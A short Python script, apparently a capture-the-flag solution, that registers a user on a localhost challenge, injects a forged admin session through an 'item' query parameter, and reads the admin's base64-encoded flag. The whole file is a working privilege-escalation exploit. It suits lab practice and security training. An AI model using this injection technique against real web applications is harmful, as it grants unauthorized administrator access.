from requests import get, post
import uuid
from base64 import b64decode

CHALLENGE_URL = "http://localhost:5000"

# Create a team session
session = post(f"{CHALLENGE_URL}/create_team_session").json()["team_session"]

# Register and login as user.
password = uuid.uuid4()
post(f"{CHALLENGE_URL}/{session}/api/register?user=user('poc','{password}')")
auth_session = post(f"{CHALLENGE_URL}/{session}/api/login?user=user('poc','{password}')").json()["session_uuid"]

# Inject the session
knownkey = uuid.uuid4()
post(f"{CHALLENGE_URL}/{session}/api/action?item=session('admin','{knownkey}')", cookies={"session": auth_session})

# Get the flag
flag_base64 = get(f"{CHALLENGE_URL}/{session}/api/action?item=note", cookies={"session": f"{knownkey}"}).json()["values"][0]
print(b64decode(flag_base64.encode('ascii')).decode('utf-8'))